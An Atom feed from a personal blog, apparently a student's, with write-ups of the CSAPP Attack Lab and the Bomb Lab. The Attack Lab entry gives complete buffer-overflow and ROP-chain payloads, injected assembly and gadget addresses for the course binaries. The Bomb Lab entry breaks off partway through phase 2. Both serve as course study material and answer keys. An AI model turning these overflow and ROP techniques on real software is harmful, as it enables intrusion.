<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lordaeron_ESZ&#39;s blog</title>
  
  <subtitle>代码-游戏-数码-技术</subtitle>
  <link href="http://lordaeronesz.github.io/atom.xml" rel="self"/>
  
  <link href="http://lordaeronesz.github.io/"/>
  <updated>2024-09-25T09:32:48.895Z</updated>
  <id>http://lordaeronesz.github.io/</id>
  
  <author>
    <name>Chaoqun Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</id>
    <published>2024-09-25T03:45:11.000Z</published>
    <updated>2024-09-25T09:32:48.895Z</updated>
    
    <content type="html"><![CDATA[<p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p><span id="more"></span><p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png"></p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p><p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop</code></pre><p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  $0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p><blockquote><p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p></blockquote><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre><p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p><p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>一种有效的注入代码完成的操作如下：</p><ol><li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li><li>跳转到程序 <code>touch2</code> 处。</li></ol><p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p><p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq</code></pre><p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png"></p><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png"></p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)&#123;    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;    if (hexmatch(cookie, sval)) &#123;    printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    validate(3);    &#125; else &#123;    printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    fail(3);    &#125;    exit(0);&#125;&#x2F;* Compare string to hex represention of unsigned value *&#x2F;int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    &#x2F;* Make position of check string unpredictable *&#x2F;    char *s &#x3D; cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;&#125;</code></pre><p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p><p>注入的代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq </code></pre><p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p><p>这里我遇到了一点问题，这是错误的攻击数据：</p><pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png"></p><p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p><pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100</code></pre><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png"></p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p><p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png"></p><p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p><p>一种正确的 gadget 组合如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3  ret</code></pre><p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p><blockquote><p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p></blockquote><p>最终的攻击数据如下：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00</code></pre><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p><p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p><p>以下是一种正确的 gadget 实现：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90nopc3ret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 dborb  %bl,%blc3ret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90nop90nopc3ret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90  nopc3  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3 ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret</code></pre><p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 &lt;strong&gt;缓冲区溢出漏洞&lt;/strong&gt; 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/</id>
    <published>2024-09-17T03:45:11.000Z</published>
    <updated>2024-09-19T06:46:56.785Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。</p><h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */</span>    <span class="token comment">/* When run with no arguments, the bomb reads its input lines     * from standard input. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file> and     * avoid having to retype it. */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!                                      * Let me know how they did it. */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* The second phase is harder.  No one will ever figure out     * how to defuse this... */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will     * confuse people. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先观察 <code>bomb.c</code> 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 <code>ans.txt</code> 中，后续在启动 bomb 程序时对其指定：<code>./bomb ans.txt</code>.</p><p>随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。</p><p>注意最后的注释：</p><blockquote><p>Wow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>一定程度上暗示了隐藏关卡的存在。</p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>每次拆弹时，可以使用 <code>disas</code> 命令进行反汇编，查看函数对应的汇编代码，以下是 <code>disas phase_1</code> 的结果：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret</code></pre><p>热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。</p><p>这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 <code>%rdi</code> 寄存器 <code>%rsi</code> 分别作为函数调用时的参数 1 和参数 2。在这里，<code>%rdi</code> 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 <code>%rsi</code> 则被赋值为 <code>0x402400</code>，然后，将这两个地址作为参数 1 和参数 2，调用 <code>string_not_equal</code>，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 <code>0x402400</code> 处的字符串值，使用 <code>x/s 0x402400</code> 查看即可。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png"></p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret</code></pre><p>这一关主要是考察 <strong>循环语句</strong> ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();if (Mem[%rsp] !&#x3D; 1) &#123;    explode_bomb();&#125;for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; 上一个元素    %eax *&#x3D; 2;    if (Mem[%rbx] !&#x3D; %eax) &#123;        explode_bomb();    &#125;&#125;</code></pre><p>首先注意到 <code>read_six_numbers()</code> 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。</p><p>然后判断 <code>Mem[%rsp]</code> 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 <code>p/x</code> 打印 <code>Mem[%rsp]</code> 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 <code>%rsp + 4 * i</code> 